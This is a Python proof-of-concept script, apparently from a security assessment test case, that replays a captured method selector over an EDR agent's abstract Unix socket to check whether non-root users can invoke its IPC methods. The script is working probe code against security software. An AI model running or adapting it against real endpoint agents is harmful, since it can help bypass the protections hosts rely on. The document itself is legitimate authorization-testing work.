#!/usr/bin/env python3
"""
ipc_authz_poc.py - TC-12 deep PoC: can a NON-ROOT process invoke EDR-X
agent IPC methods?

Protocol (reverse-engineered from `strace edrctl control status`):
  transport : abstract UDS, SOCK_SEQPACKET, @agent_ipc_<token>
  framing   : 8-byte little-endian length prefix, then payload
  request   : payload = 8-byte method selector (deterministic per method,
              NOT a per-session secret / nonce)
  response  : 8-byte LE length, then that many bytes

This replays the exact method selector captured from a legitimate root client.
If a non-root user gets a valid structured response, the IPC has NO effective
authentication at either the transport or message layer.

Usage: ipc_authz_poc.py [hex_method_selector]
       default selector = a2d6ed9cfc61e58c (captured 'control status' query)
"""
import os
import socket
import struct
import sys

DEFAULT_SELECTOR = "a2d6ed9cfc61e58c"


def find_agent_ipc():
    for line in open("/proc/net/unix").read().splitlines()[1:]:
        p = line.split()
        if len(p) >= 8 and p[-1].startswith("@agent_ipc_"):
            return p[-1]
    return None


def call(name, selector):
    addr = b"\0" + name[1:].encode()
    s = socket.socket(socket.AF_UNIX, socket.SOCK_SEQPACKET)
    s.settimeout(3)
    # The legitimate client (edrctl) sets SO_PASSCRED before connect, so the
    # kernel attaches SCM_CREDENTIALS (real uid/gid/pid) to the messages. A non-root
    # process can only attach its OWN uid (kernel forbids forging uid=0). If the
    # server validates these creds, crtester will be rejected here.
    s.setsockopt(socket.SOL_SOCKET, socket.SO_PASSCRED, 1)
    s.connect(addr)
    # 8-byte LE length header + payload (the method selector)
    s.send(struct.pack("<Q", len(selector)))
    s.send(selector)
    hdr = s.recv(8)
    if len(hdr) < 8:
        s.close()
        return None, f"short header ({len(hdr)}B)"
    n = struct.unpack("<Q", hdr)[0]
    body = s.recv(n) if n else b""
    s.close()
    return body, None


def main():
    sel_hex = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_SELECTOR
    selector = bytes.fromhex(sel_hex)
    name = find_agent_ipc()
    print(f"uid={os.getuid()} socket={name} selector={sel_hex}")
    if not name:
        print("RESULT: agent_ipc socket not found")
        return
    try:
        body, err = call(name, selector)
    except OSError as e:
        print(f"RESULT: connection/protocol error: errno={e.errno} {e.strerror}")
        return
    if err:
        print(f"RESULT: {err}")
        return
    print(f"RESULT: got {len(body)}-byte response")
    print(f"  hex: {body.hex()}")
    # interpret leading LE uint32 fields (the status query returns int fields)
    ints = [struct.unpack_from('<I', body, i)[0] for i in range(0, min(len(body), 32), 4)]
    print(f"  first LE uint32s: {ints}")
    print(">>> NON-ROOT INVOCATION SUCCEEDED <<<" if os.getuid() != 0 and body
          else ">>> (root baseline) <<<" if body else "")


if __name__ == "__main__":
    main()
